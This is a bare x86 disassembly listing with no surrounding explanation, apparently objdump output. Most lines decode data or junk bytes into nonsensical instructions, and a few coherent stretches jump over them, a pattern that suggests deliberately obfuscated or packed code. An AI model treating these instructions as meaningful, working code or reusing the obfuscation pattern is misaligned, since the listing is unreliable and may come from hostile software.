  40a81c:	sub    ecx,edx
  40a81e:	xor    ecx,DWORD PTR [ecx+edx*1]
  40a821:	mov    DWORD PTR [ebp-0x8],0xf89c8535
  40a828:	sbb    ecx,0x259c
  40a82e:	jmp    0x40aa29
  40a833:	imul   ebp,ecx,0x7a81ca81
  40a839:	jge    0x40a8a8
  40a83b:	dec    esp
  40a83c:	jb     0x40a8a1
  40a83e:	jmp    0x40a86a
  40a840:	hlt    
  40a841:	add    dl,BYTE PTR cs:0x5c7e7eeb
  40a848:	jg     0x40a8c8
  40a84a:	jle    0x40a8bd
  40a84c:	pop    ebx
  40a84d:	addr16 and al,0x41
  40a850:	icebp  
  40a851:	dec    edx
  40a852:	push   eax
  40a853:	out    dx,eax
  40a854:	push   ecx
  40a855:	mov    fs,WORD PTR [edi+0xe]
  40a858:	mov    al,ds:0xb95d7782
  40a85d:	(bad)  
  40a85e:	mov    ebp,0x749f7db
  40a863:	mov    ds:0x386cc1d1,al
  40a868:	xchg   ecx,eax
  40a869:	nop
  40a86a:	jnp    0x40a837
  40a86c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a86d:	cld    
  40a86e:	ret    
  40a86f:	mov    esp,esp
  40a871:	mov    ss,WORD PTR [eax-0x59f867c8]
  40a877:	out    dx,al
  40a878:	mov    dh,0x81
  40a87a:	xchg   esp,edi
  40a87c:	mov    ebx,0x7a31d6d7
  40a881:	dec    esi
  40a882:	icebp  
  40a883:	mov    ebp,0xeb291ac4
  40a888:	jne    0x40a8b0
  40a88a:	add    edi,DWORD PTR [edx+0x24c37d64]
  40a890:	cmp    esp,DWORD PTR [edx+0x35ccd21f]
  40a896:	not    DWORD PTR [esi+0x30]
  40a899:	and    al,0x5e
  40a89b:	xlat   BYTE PTR ds:[ebx]
  40a89c:	cmp    al,0xe4
  40a89e:	fcomp  DWORD PTR [eax+eiz*2]
  40a8a1:	inc    esp
  40a8a2:	scas   al,BYTE PTR es:[edi]
  40a8a3:	shl    BYTE PTR [ecx+0x24febcb5],0xc1
  40a8aa:	ins    DWORD PTR es:[edi],dx
  40a8ab:	pop    ss
  40a8ac:	dec    ecx
  40a8ad:	jbe    0x40a880
  40a8af:	jo     0x40a8c5
  40a8b1:	mov    dl,0xf4
  40a8b3:	mov    BYTE PTR ds:[edi-0x285c87d2],bh
  40a8ba:	adc    ebp,esp
  40a8bc:	sub    al,0x31
  40a8be:	in     al,dx
  40a8bf:	das    
  40a8c0:	imul   eax,ecx,0xccd7c0cc
  40a8c6:	std    
  40a8c7:	fwait
  40a8c8:	pop    ds
  40a8c9:	loopne 0x40a867
  40a8cb:	sti    
  40a8cc:	ins    BYTE PTR es:[edi],dx
  40a8cd:	loop   0x40a8b0
  40a8cf:	ret    
  40a8d0:	or     al,0x1e
  40a8d2:	ftst   
  40a8d4:	rcr    DWORD PTR [eax+0x11],cl
  40a8d7:	inc    esp
  40a8d8:	mov    eax,0xebad0515
  40a8dd:	lds    esi,FWORD PTR [edi+0x3b61b73c]
  40a8e3:	inc    esp
  40a8e4:	das    
  40a8e5:	hlt    
  40a8e6:	and    edx,DWORD PTR [esi+ecx*8-0x2180fa90]
  40a8ed:	and    eax,0x1637d979
  40a8f2:	sub    bl,bl
  40a8f4:	or     al,0x3c
  40a8f6:	xor    cl,bl
  40a8f8:	test   DWORD PTR [esi-0x2b6fdfd7],0x7fbe9538
  40a902:	fldenv [eax-0x797b95bf]
  40a908:	enter  0xd9ab,0xcb
  40a90c:	mul    BYTE PTR [ecx-0x3d]
  40a90f:	mov    bl,0xd4
  40a911:	fldcw  WORD PTR [esi-0x69d63f55]
  40a917:	push   0xffffff83
  40a919:	xor    DWORD PTR [edx],0xffffffca
  40a91c:	outs   dx,BYTE PTR ds:[esi]
  40a91d:	or     esp,esi
  40a91f:	sbb    eax,0x63747a6a
  40a924:	call   0x25229eb2
  40a929:	pop    ss
  40a92a:	push   esp
  40a92b:	push   edi
  40a92c:	mov    al,ds:0xa54aaf4
  40a931:	mov    ch,0x71
  40a933:	or     al,0x48
  40a935:	movhps xmm5,QWORD PTR [edx+edx*8-0x5e67a1d1]
  40a93d:	loop   0x40a9ad
  40a93f:	hlt    
  40a940:	add    ch,al
  40a942:	or     DWORD PTR [edx+0x2357cae3],ebp
  40a948:	cs push cs
  40a94a:	xchg   esi,eax
  40a94b:	adc    BYTE PTR ds:[edi-0x6cf1da2e],cl
  40a952:	int    0x53
  40a954:	repz adc bh,al
  40a957:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a958:	lahf   
  40a959:	nop
  40a95a:	call   0xf58b:0x67387da1
  40a961:	scas   eax,DWORD PTR es:[edi]
  40a962:	xor    al,0x13
  40a964:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a965:	test   DWORD PTR [eax+0x2c],ecx
  40a968:	and    ah,BYTE PTR [edx]
  40a96a:	mov    bh,0x91
  40a96c:	add    eax,0x4970440e
  40a971:	add    ebx,DWORD PTR [ebp-0x6e609719]
  40a977:	add    eax,0xb392bde5
  40a97c:	sub    ah,BYTE PTR [edx]
  40a97e:	sub    DWORD PTR [ebp+0x68],0x20f21e5e
  40a985:	daa    
  40a986:	fistp  DWORD PTR [edi]
  40a988:	dec    ecx
  40a989:	push   cs
  40a98a:	xchg   ecx,eax
  40a98b:	push   ebp
  40a98c:	cmp    al,0xd
  40a98e:	fcomp  DWORD PTR [edx-0x78]
  40a991:	icebp  
  40a992:	sar    DWORD PTR [esi-0x380f54c4],0x19
  40a999:	(bad)  [edi]
  40a99b:	(bad)  
  40a99d:	enter  0xa1e4,0xd4
  40a9a1:	sub    BYTE PTR [ebx+esi*8+0x73d11cfa],ch
  40a9a8:	outs   dx,BYTE PTR ds:[esi]
  40a9a9:	aad    0x46
  40a9ab:	jg     0x40aa2a
  40a9ad:	push   0x1d
  40a9af:	mov    ecx,0x663277bf
  40a9b4:	or     al,0x47
  40a9b6:	xlat   BYTE PTR ds:[ebx]
  40a9b7:	jle    0x40a950
  40a9b9:	mov    ch,0xfa
  40a9bb:	mov    al,0x7b
  40a9bd:	mov    ebx,0x780beea0
  40a9c2:	lea    edx,[ebx-0x11]
  40a9c5:	in     eax,0x14
  40a9c7:	test   al,0x24
  40a9c9:	mov    al,0xf7
  40a9cb:	jecxz  0x40a9c3
  40a9cd:	into   
  40a9ce:	jbe    0x40a9e8
  40a9d0:	sti    
  40a9d1:	push   ds
  40a9d2:	and    al,0xc8
  40a9d4:	cs sbb eax,0x136b20df
  40a9da:	pusha  
  40a9db:	dec    ebp
  40a9dc:	fcmovnb st,st(3)
  40a9de:	jne    0x40a9f7
  40a9e0:	adc    ch,cl
  40a9e2:	sub    cl,BYTE PTR [edi]
  40a9e4:	mov    dh,0xb8
  40a9e6:	sbb    cl,ah
  40a9e8:	cmc    
  40a9e9:	(bad)  
  40a9ea:	mov    esi,DWORD PTR [eax]
  40a9ec:	lea    ecx,[esi+0x46050602]
  40a9f2:	out    0x15,eax
  40a9f4:	ja     0x40aa74
  40a9f6:	cmp    DWORD PTR [ecx+0x49],eax
  40a9f9:	and    cl,BYTE PTR [edx+edi*8-0x6b]
  40a9fd:	retf   0xec2d
  40aa00:	out    dx,eax
  40aa01:	add    edi,esp
  40aa03:	(bad)  [esi+0x79]
  40aa06:	jbe    0x40a9e5
  40aa08:	push   cs
  40aa09:	sbb    BYTE PTR [esi],bl
  40aa0b:	out    0x2e,al
  40aa0d:	cmp    BYTE PTR [ebx+0x58],dl
  40aa10:	call   0xb409:0xffee0ee1
  40aa17:	cmp    al,0x52
  40aa19:	pop    esi
  40aa1a:	(bad)  
  40aa1b:	mov    dh,0x74
  40aa1d:	pop    edi
  40aa1e:	sub    eax,edi
  40aa20:	cmp    esp,ecx
  40aa22:	or     BYTE PTR [ebp-0x4b1ed971],ch
  40aa28:	pop    ss
  40aa29:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  40aa30:	or     edx,ecx
  40aa32:	mov    eax,DWORD PTR [ebp-0x4]
  40aa35:	push   esi
  40aa36:	or     ecx,edx
  40aa38:	mov    esi,DWORD PTR [ebp-0x8]
  40aa3b:	add    ecx,ecx
  40aa3d:	mov    edx,0x7510856
  40aa42:	xor    eax,edx
  40aa44:	xor    DWORD PTR ds:0x42e762,0x78fe
  40aa4e:	xor    esi,edx
  40aa50:	dec    ecx
  40aa51:	mov    ecx,0x32729d
  40aa56:	add    esi,ecx
  40aa58:	add    DWORD PTR ds:0x43055a,0x42e762
  40aa62:	add    eax,ecx
  40aa64:	imul   eax,esi
  40aa67:	mov    esi,DWORD PTR [ebp+0xc]
  40aa6a:	mov    DWORD PTR ds:0x42e75a,0x6fc4
  40aa74:	cmp    esi,eax
  40aa76:	mov    DWORD PTR ds:0x430556,0x4d9
  40aa80:	jne    0x40ae92
  40aa86:	mov    eax,DWORD PTR [ebp-0x4]
  40aa89:	mov    esi,DWORD PTR [ebp-0x8]
  40aa8c:	jmp    0x40ac87
  40aa91:	fisubr DWORD PTR [ebp-0x80]
  40aa94:	cld    
  40aa95:	mov    eax,ds:0x406d7afd
  40aa9a:	adc    DWORD PTR [ecx-0x7],esp
  40aa9d:	mov    WORD PTR [ecx+0x4e],es
  40aaa0:	mov    BYTE PTR [ebx-0x13],dh
  40aaa3:	jle    0x40ab23
  40aaa5:	pop    esp
  40aaa6:	jg     0x40ab26
  40aaa8:	jle    0x40aab9
  40aaaa:	fistp  QWORD PTR [eax-0x2788a901]
  40aab0:	das    
  40aab1:	pop    ebx
  40aab2:	cwde   
  40aab3:	cmp    al,0x61
  40aab5:	or     bl,ah
  40aab7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aab8:	ror    DWORD PTR [esp+ebx*8-0x1f],0xb9
  40aabd:	mov    DWORD PTR [edx-0x2d8f466b],ebx
  40aac3:	inc    edi
  40aac4:	enter  0x42d9,0x1c
  40aac8:	bound  eax,QWORD PTR [esi-0x4b40d546]
  40aace:	outs   dx,BYTE PTR ds:[esi]
  40aacf:	and    dl,BYTE PTR [ebx-0x4c]
  40aad2:	jp     0x40aa87
  40aad4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aad5:	in     al,0xfa
  40aad7:	adc    al,0xdb
  40aad9:	pushf  
  40aada:	fiadd  WORD PTR [edx+0x491debaf]
  40aae0:	sbb    al,0x45
  40aae2:	mov    edx,0xd900f828
  40aae7:	push   esi
  40aae8:	fbld   TBYTE PTR ds:[ecx-0x593a93ae]
  40aaef:	push   esi
  40aaf0:	daa    
  40aaf1:	inc    ebx
  40aaf2:	dec    eax
  40aaf3:	fild   DWORD PTR [esi-0x6fc8da9e]
  40aaf9:	cwde   
  40aafa:	les    edx,FWORD PTR [ebx+edi*4+0x7d]
  40aafe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aaff:	(bad)  
  40ab00:	scas   eax,DWORD PTR es:[edi]
  40ab01:	xor    al,0xb5
  40ab03:	shr    DWORD PTR [ebp-0x5d],0xb6
  40ab07:	mov    esi,0x5f592152
  40ab0c:	into   
  40ab0d:	and    cl,BYTE PTR [eax-0x80]
  40ab10:	addr16 mov dl,0xcf
  40ab13:	dec    ebx
  40ab14:	pusha  
  40ab15:	leave  
  40ab16:	(bad)  
  40ab17:	jmp    0xba98e333
  40ab1c:	rol    bh,cl
  40ab1e:	test   eax,0x111ea20b
  40ab23:	stos   DWORD PTR es:[edi],eax
  40ab24:	shr    BYTE PTR [eax],cl
  40ab26:	out    0xe5,al
  40ab28:	mov    ebp,0x149c80e7
  40ab2d:	dec    edi
  40ab2e:	jb     0x40ab2b
  40ab30:	leave  
  40ab31:	or     esp,DWORD PTR [ebp+0x29]
  40ab34:	mov    ds:0xd60480f6,eax
  40ab39:	ins    DWORD PTR es:[edi],dx
  40ab3a:	xchg   edi,eax
  40ab3b:	xor    eax,0x70
  40ab3e:	mov    esi,0xb44bf718
  40ab43:	aad    0x21
  40ab45:	(bad)  
  40ab46:	xor    eax,0x42a57227
  40ab4b:	xchg   ecx,eax
  40ab4c:	pushf  
  40ab4d:	out    dx,al
  40ab4e:	ja     0x40aaf2
  40ab50:	push   edx
  40ab51:	jge    0x40ab01
  40ab53:	imul   edi,DWORD PTR [edx-0x4f],0xc
  40ab57:	leave  
  40ab58:	cmc    
  40ab59:	div    DWORD PTR [ebp-0x52b385f3]
  40ab5f:	mov    ebx,0x6b2daf3e
  40ab64:	fwait
  40ab65:	mov    edi,0x85d9e86f
  40ab6a:	mov    esi,0x8ef2b4ff
  40ab6f:	push   0x784b9b7d
  40ab74:	stc    
  40ab75:	cmp    esp,DWORD PTR [ebx]
  40ab77:	dec    ecx
  40ab78:	cmp    BYTE PTR [edx],dh
  40ab7a:	sahf   
  40ab7b:	mov    cl,0x95
  40ab7d:	lock inc ebp
  40ab7f:	sub    cl,BYTE PTR [esi]
  40ab81:	lahf   
  40ab82:	mov    esp,DWORD PTR [eax+0x18]
  40ab85:	sbb    esi,DWORD PTR [ebx-0x67448a44]
  40ab8b:	loop   0x40abc2
  40ab8d:	cs repnz adc eax,0xc9516d17
  40ab94:	cmc    
  40ab95:	(bad)  
  40ab96:	xchg   esi,eax
  40ab97:	add    dh,BYTE PTR [eax+0x8f74c19]
  40ab9d:	jl     0x40abd1
  40ab9f:	cwde   
  40aba0:	mov    esp,esp
  40aba2:	dec    esp
  40aba3:	sbb    BYTE PTR [eax],0x27
  40aba6:	push   edx
  40aba7:	fdiv   DWORD PTR [eax-0x5f]
  40abaa:	sti    
  40abab:	test   BYTE PTR [ecx],cl
  40abad:	xchg   ah,cl
  40abaf:	sbb    esi,eax
  40abb1:	jle    0x40ab5f
  40abb3:	pop    esi
  40abb4:	cwde   
  40abb5:	mov    bl,0xa6
  40abb7:	mov    ?,WORD PTR [esi]
  40abb9:	xchg   esi,eax
  40abba:	mov    dh,0x55
  40abbc:	lods   eax,DWORD PTR ds:[esi]
  40abbd:	sub    dh,BYTE PTR [edx]
  40abbf:	test   al,0x89
  40abc1:	nop
  40abc2:	out    0x1a,eax
  40abc4:	lods   al,BYTE PTR ds:[esi]
  40abc5:	in     eax,0xce
  40abc7:	dec    eax
  40abc8:	popa   
  40abc9:	cmp    al,0x8
  40abcb:	ja     0x40abed
  40abcd:	mov    ch,0x36
  40abcf:	lods   al,BYTE PTR ds:[esi]
  40abd0:	and    esi,edx
  40abd2:	add    dl,BYTE PTR [ebp+0x18]
  40abd5:	xchg   edx,eax
  40abd6:	or     eax,0x9ff3bc77
  40abdb:	imul   ebp,DWORD PTR [esi-0x22f8ef98],0xfffffff5
  40abe2:	add    DWORD PTR [edi-0x6aa5e8cf],ebx
  40abe8:	lock inc edi
  40abea:	and    BYTE PTR [edx-0x2fa7b9c0],cl
  40abf0:	shr    DWORD PTR [edx-0x2d],1
  40abf3:	or     al,0x1b
  40abf5:	sahf   
  40abf6:	inc    cx
  40abf8:	js     0x40ab93
  40abfa:	mov    edi,0xda6fe7aa
  40abff:	out    0xb5,eax
  40ac01:	and    DWORD PTR [ecx-0x5370cea4],esp
  40ac07:	push   0xffffff88
  40ac09:	scas   eax,DWORD PTR es:[edi]
  40ac0a:	cs adc al,ah
  40ac0d:	xchg   esp,eax
  40ac0e:	stos   BYTE PTR es:[edi],al
  40ac0f:	push   ds
  40ac10:	sub    al,cl
  40ac12:	dec    esi
  40ac13:	outs   dx,DWORD PTR ds:[esi]
  40ac14:	iret   
  40ac15:	mov    ah,0x49
  40ac17:	idiv   DWORD PTR [esi+ebx*4]
  40ac1a:	ins    BYTE PTR es:[edi],dx
  40ac1b:	fldpi  
  40ac1d:	bound  ecx,QWORD PTR [edx]
  40ac1f:	sub    DWORD PTR [eax+ebp*1+0x3f7bfd55],ecx
  40ac26:	sbb    bl,BYTE PTR [edx+0x4ac788b3]
  40ac2c:	mov    cl,0x6
  40ac2e:	add    DWORD PTR [eax],0xffffffda
  40ac31:	lds    esi,FWORD PTR [eax+0x480c7552]
  40ac37:	nop
  40ac38:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ac39:	xchg   esi,eax
  40ac3a:	jg     0x40ac39
  40ac3c:	(bad)  
  40ac3d:	pop    ecx
  40ac3e:	lods   eax,DWORD PTR ds:[esi]
  40ac3f:	jb     0x40abdd
  40ac41:	mov    eax,ds:0xfe6ec17e
  40ac46:	xor    dl,BYTE PTR [ecx]
  40ac48:	clc    
  40ac49:	stos   BYTE PTR es:[edi],al
  40ac4a:	or     eax,0xfc7eddb3
  40ac4f:	jno    0x40ac00
  40ac51:	cmp    al,0x2f
  40ac53:	nop
  40ac54:	pop    DWORD PTR [ebx-0x6acd2078]
  40ac5a:	imul   eax,DWORD PTR [edi],0x80edb13d
  40ac60:	fwait
  40ac61:	and    DWORD PTR [ebp+0x2a],esi
  40ac64:	dec    esi
  40ac65:	jecxz  0x40acd3
  40ac67:	jle    0x40ac89
  40ac69:	ja     0x40ac03
  40ac6b:	mov    ebx,DWORD PTR [ebp+ebx*1-0x746a9e07]
  40ac72:	pusha  
  40ac73:	sub    esi,DWORD PTR [edx+0x130a45c2]
  40ac79:	push   ds
  40ac7a:	test   eax,0xa362d6f2
  40ac7f:	mov    bl,0xe2
  40ac81:	fstp   TBYTE PTR [edi-0x1f58d0a3]
  40ac87:	xor    eax,edx
  40ac89:	xor    esi,edx
  40ac8b:	add    eax,ecx
  40ac8d:	jmp    0x40ae88
  40ac92:	pop    ebp
  40ac93:	icebp  
  40ac94:	lds    esp,FWORD PTR [eax-0x23]
  40ac97:	fs jge 0x40ac47
  40ac9a:	xchg   edi,eax
  40ac9b:	imul   ebx,edx,0x5af1e502
  40aca1:	add    edx,DWORD PTR [ecx-0x12]
  40aca4:	jle    0x40ad24
  40aca6:	pop    esp
  40aca7:	jg     0x40ad27
  40aca9:	jle    0x40ad12
  40acab:	lea    esi,ds:0xa3e99cda
  40acb1:	mov    dh,dl
  40acb3:	out    0x8a,eax
  40acb5:	mov    esp,0xfcc63d3c
  40acba:	add    edx,ecx
  40acbc:	je     0x40ac50
  40acbe:	fwait
  40acbf:	sub    eax,0x32b5d1d9
  40acc4:	pop    ebx
  40acc5:	mov    dh,0xb2
  40acc7:	mov    ah,0xa
  40acc9:	push   edi
  40acca:	add    edx,edi
  40accc:	sbb    esp,esi
  40acce:	fst    st(4)
  40acd0:	jno    0x40ad00
  40acd2:	(bad)  
  40acd3:	gs popf 
  40acd5:	xor    eax,0x60af725b
  40acda:	arpl   WORD PTR [edi+edi*2],di
  40acdd:	in     al,dx
  40acde:	pop    edx
  40acdf:	pop    ebp
  40ace0:	jmp    DWORD PTR [ebp+eiz*1-0x550667c4]
  40ace7:	sti    
  40ace8:	loopne 0x40ad33
  40acea:	inc    edx
  40aceb:	retf   0x23fe
  40acee:	inc    ebp
  40acef:	jecxz  0x40ad31
  40acf1:	cmp    eax,0xf3893536
  40acf6:	into   
  40acf7:	adc    al,0xd4
  40acf9:	xor    al,0x40
  40acfb:	hlt    
  40acfc:	jecxz  0x40acf3
  40acfe:	push   ebx
  40acff:	add    DWORD PTR [ecx+0x5e],ecx
  40ad02:	push   esi
  40ad03:	loop   0x40acb4
  40ad05:	sub    edx,DWORD PTR es:[edi-0x48af5572]
  40ad0c:	shr    DWORD PTR [edi],0x9a
  40ad0f:	cmp    bh,cl
  40ad11:	clc    
  40ad12:	cmp    eax,0xe1d0b257
  40ad17:	push   0x9a3dde23
  40ad1c:	mov    ds:0x4966489e,al
  40ad21:	mov    cl,al
  40ad23:	adc    DWORD PTR [esi],ebx
  40ad25:	aaa    
  40ad26:	mov    dl,0x28
  40ad28:	or     ah,ah
  40ad2a:	pop    esp
  40ad2b:	mov    WORD PTR [edx+0x5b],gs
  40ad2e:	fs add eax,0x60038d20
  40ad34:	mov    ss,WORD PTR [ecx+edx*8+0x2a]
  40ad38:	cmp    al,0x69
  40ad3a:	fild   DWORD PTR [ebx]
  40ad3c:	mov    ebp,0xab94ecf1
  40ad41:	mov    ch,BYTE PTR [ebp-0x3f]
  40ad44:	mov    ch,0x81
  40ad46:	cmp    esp,DWORD PTR [ebx-0x78]
  40ad49:	jno    0x40ad6c
  40ad4b:	fidivr WORD PTR [ecx+0x687eb955]
  40ad51:	dec    edi
  40ad52:	xlat   BYTE PTR ds:[ebx]
  40ad53:	es mov esp,0xc113418f
  40ad59:	inc    ebx
  40ad5a:	pop    ebp
  40ad5b:	lds    esp,FWORD PTR gs:[edx]
  40ad5e:	arpl   WORD PTR [esp+esi*4+0x376e474c],bx
  40ad65:	scas   eax,DWORD PTR es:[edi]
  40ad66:	sti    
  40ad67:	pop    eax
  40ad68:	das    
  40ad69:	mov    ds:0xe0f649a9,al
  40ad6e:	pop    ss
  40ad6f:	aaa    
  40ad70:	cmp    eax,DWORD PTR [ebx+0x37]
  40ad73:	add    ah,0x3a
  40ad76:	mov    ebp,0xb028b299
  40ad7b:	repnz shl BYTE PTR [edi+edi*1+0x3d],cl
  40ad80:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ad81:	mov    al,ds:0x171241e6
  40ad86:	mov    edx,0x9b222abf
  40ad8b:	aad    0x7c
  40ad8d:	cmp    al,0x5a
  40ad8f:	add    DWORD PTR ds:0x55a628d3,eax
  40ad95:	push   eax
  40ad96:	fidiv  WORD PTR [ebp*4+0x77a4b4c4]
  40ad9d:	cmp    DWORD PTR [ecx+0x6f4f067c],0x2d80b2a8
  40ada7:	je     0x40ada0
  40ada9:	fdivr  QWORD PTR [ecx+ebx*2+0x824dea9]
  40adb0:	clc    
  40adb1:	mov    bh,0x1e
  40adb3:	xchg   DWORD PTR [eax+edi*1-0x57],ebx
  40adb7:	sub    DWORD PTR [edx-0x1c9c7ad4],esi
  40adbd:	jno    0x40ad4b
  40adbf:	stos   BYTE PTR es:[edi],al
  40adc0:	xor    ch,dl
  40adc2:	and    DWORD PTR [esi-0x24],edi
  40adc5:	aaa    
  40adc6:	frstor [edi+0x65]
  40adc9:	pop    ss
  40adca:	aas    
  40adcb:	in     al,0x7b
  40adcd:	shl    al,cl
  40adcf:	imul   ecx,edx,0xffffff9a
  40add2:	jle    0x40ae41
  40add4:	inc    ebx
  40add5:	dec    ebx
  40add6:	loopne 0x40ad5e
  40add8:	adc    esi,DWORD PTR [ebx-0x15]
  40addb:	mov    esp,0x91017059
  40ade0:	xchg   edx,eax
  40ade1:	cmp    esi,DWORD PTR [ebp+0x1a]
  40ade4:	ficom  WORD PTR [edi+0x601303f8]
  40adea:	dec    eax
  40adeb:	cwde   
  40adec:	mov    al,ds:0x4eb85085
  40adf1:	add    al,0x63
  40adf3:	dec    eax
  40adf4:	retf   0xb293
  40adf7:	mov    esp,0x1dfcf5a1
  40adfc:	das    
  40adfd:	pusha  
  40adfe:	mov    dh,0xf4
  40ae00:	inc    ecx
  40ae01:	out    0xfd,al
  40ae03:	das    
  40ae04:	fs dec edx
  40ae06:	xor    ch,BYTE PTR [ecx+0xd]
  40ae09:	rcl    BYTE PTR [ebx+0x964461],cl
  40ae0f:	dec    esp
  40ae10:	xchg   BYTE PTR [ecx],bl
  40ae12:	out    dx,eax
  40ae13:	das    
  40ae14:	mov    dh,0x88
  40ae16:	pop    ebx
  40ae17:	mov    edx,DWORD PTR [esi-0x1f6acc89]
  40ae1d:	arpl   WORD PTR [ebx+0x76e3bb23],ax
  40ae23:	or     BYTE PTR [esi],dl
  40ae25:	sbb    ch,BYTE PTR [edx+0x13]
  40ae28:	fadd   QWORD PTR ds:0xcf653e8b
  40ae2e:	push   es
  40ae2f:	jg     0x40ae02
  40ae31:	mov    ebx,0x2bade4
  40ae36:	and    eax,0x15ab31c9
  40ae3b:	repnz es test al,0xc9
  40ae3f:	js     0x40aeaa
  40ae41:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ae42:	stos   BYTE PTR es:[edi],al
  40ae43:	shr    BYTE PTR [esi+0x2],0x9a
  40ae47:	dec    eax
  40ae48:	xchg   ebp,eax
  40ae49:	mov    bh,BYTE PTR [ebp+0x65]
  40ae4c:	mov    esp,0x39f7ad25
  40ae51:	(bad)  
  40ae52:	push   ss
  40ae53:	or     al,0x55
  40ae55:	mov    ds:0x170aa17f,al
  40ae5a:	fcomp  DWORD PTR [ebx+0x3f]
  40ae5d:	push   ss
  40ae5e:	inc    esi
  40ae5f:	jp     0x40aec1
  40ae61:	out    dx,al
  40ae62:	repnz aad 0x93
  40ae65:	or     esi,DWORD PTR [esi+edx*1-0x2f]
  40ae69:	ins    DWORD PTR es:[edi],dx
  40ae6a:	fadd   DWORD PTR [edx+0x67ab2cbb]
  40ae70:	mov    dh,0x84
  40ae72:	lea    ebp,[ecx]
  40ae74:	ss cmp al,0x79
  40ae77:	gs mov esp,0xdbb56262
  40ae7d:	sub    dl,BYTE PTR [eax+0x75b252f8]
  40ae83:	scas   al,BYTE PTR es:[edi]
  40ae84:	xor    bl,BYTE PTR ds:0xf1036740
  40ae8a:	imul   eax,esi
  40ae8d:	jmp    0x40b2c3
  40ae92:	mov    eax,DWORD PTR [ebp+0xc]
  40ae95:	mov    eax,DWORD PTR [eax+0x78]
  40ae98:	mov    DWORD PTR [ebp+0xc],eax
  40ae9b:	mov    eax,DWORD PTR [ebp-0x4]
  40ae9e:	mov    esi,DWORD PTR [ebp-0x8]
  40aea1:	jmp    0x40b09c
  40aea6:	aad    0xc4
  40aea8:	outs   dx,DWORD PTR ds:[esi]
  40aea9:	mov    BYTE PTR [edi-0x53],ch
  40aeac:	std    
  40aead:	jge    0x40af09
  40aeaf:	outs   dx,DWORD PTR ds:[esi]
  40aeb0:	stos   DWORD PTR es:[edi],eax
  40aeb1:	lock fst st(1)
  40aeb4:	mov    bl,0x50
  40aeb6:	mov    edi,0x5c7e7ee0
  40aebb:	jg     0x40af3b
  40aebd:	jle    0x40aec6
  40aebf:	rcl    DWORD PTR [esi+esi*1-0x689a7a21],0x89
  40aec7:	xchg   edx,eax
  40aec8:	sub    edi,eax
  40aeca:	dec    esp
  40aecb:	inc    eax
  40aecc:	or     ch,ah
  40aece:	sar    al,0xb3
  40aed1:	xchg   esi,eax
  40aed2:	test   DWORD PTR [edx+0x73b35211],edi
  40aed8:	bswap  ecx
  40aeda:	mov    esp,0xed73ba90
  40aedf:	es dec ebp
  40aee1:	pop    esi
  40aee2:	fldenv [edx+0x4c6f8f71]
  40aee8:	das    
  40aee9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aeea:	mov    al,ds:0x2c5b291a
  40aeef:	push   edx
  40aef0:	ds shl esp,1
  40aef3:	push   ds
  40aef4:	sub    eax,0x26930ff6
  40aef9:	das    
  40aefa:	jl     0x40ae8b
  40aefc:	retf   0x9c53
  40aeff:	inc    esi
  40af00:	sub    esp,edi
  40af02:	xor    DWORD PTR [esi-0x54],esi
  40af05:	rcr    edx,cl
  40af07:	or     dh,BYTE PTR [ecx+0x72d14fb5]
  40af0d:	cld    
  40af0e:	add    DWORD PTR [esi+0x65d0160b],esp
  40af14:	test   al,0xd7
  40af16:	ja     0x40aeea
  40af18:	sbb    al,0x39
  40af1a:	cld    
  40af1b:	jl     0x40aee5
  40af1d:	jle    0x40aed6
  40af1f:	das    
  40af20:	cmp    esp,ebx
  40af22:	cdq    
  40af23:	inc    eax
  40af24:	test   eax,0x9537c9f
  40af29:	add    ah,0xc9
  40af2c:	nop
  40af2d:	dec    esp
  40af2e:	mov    ch,0xc2
  40af30:	xchg   ebp,eax
  40af31:	sbb    al,0x98
  40af33:	and    edi,esp
  40af35:	(bad)
  40af39:	jle    0x40afa6
  40af3b:	or     esp,DWORD PTR [edx+0x8c3d9bf]
  40af41:	fsub   DWORD PTR [esp+edi*1]
  40af44:	inc    ecx
  40af45:	imul   BYTE PTR [eax+0x4653e81b]
  40af4b:	out    dx,al
  40af4c:	nop
  40af4d:	cmp    esp,DWORD PTR [ecx]
  40af4f:	ins    BYTE PTR es:[edi],dx
  40af50:	mov    ds:0xc371a097,eax
  40af55:	dec    esi
  40af56:	lahf   
  40af57:	cmp    al,0xb8
  40af59:	(bad)  
  40af5a:	pop    es
  40af5b:	mov    ebp,0x3589935a
  40af60:	push   ebp
  40af61:	push   ss
  40af62:	dec    ebx
  40af63:	in     al,0x80
  40af65:	shl    edx,cl
  40af67:	dec    esi
  40af68:	hlt    
  40af69:	mov    DWORD PTR [edi],ecx
  40af6b:	ds adc eax,esp
  40af6e:	or     ecx,ecx
  40af70:	ins    BYTE PTR es:[edi],dx
  40af71:	sbb    eax,0xf7e34a6f
  40af76:	retf   
  40af77:	ja     0x40af68
  40af79:	int    0x19
  40af7b:	std    
  40af7c:	lea    eax,[esi-0x3]
  40af7f:	ins    BYTE PTR es:[edi],dx
  40af80:	test   eax,0x22274b87
  40af85:	mov    bl,0xaa
  40af87:	pop    esi
  40af88:	mov    ebp,0x282b69
  40af8d:	push   0x50e91848
  40af92:	or     DWORD PTR [ecx+0x7dc84310],esi
  40af98:	cmp    al,BYTE PTR [ecx]
  40af9a:	rcr    DWORD PTR [ecx*2+0x248662c0],0x4f
  40afa2:	outs   dx,DWORD PTR ds:[esi]
  40afa3:	retf   
  40afa4:	pusha  
  40afa5:	pop    ds
  40afa6:	xchg   ecx,eax
  40afa7:	sub    ah,dl
  40afa9:	hlt    
  40afaa:	mov    ebx,0x13b1c075
  40afaf:	fidivr WORD PTR [ecx]
  40afb1:	outs   dx,DWORD PTR ds:[si]
  40afb3:	pushf  
  40afb4:	mov    esp,0x76c3dbb5
  40afb9:	cmc    
  40afba:	pusha  
  40afbb:	or     ch,dh
  40afbd:	jg     0x40af86
  40afbf:	ret    
  40afc0:	add    eax,0x69b8e3cc
  40afc5:	je     0x40af4d
  40afc7:	sbb    DWORD PTR [ebx],esp
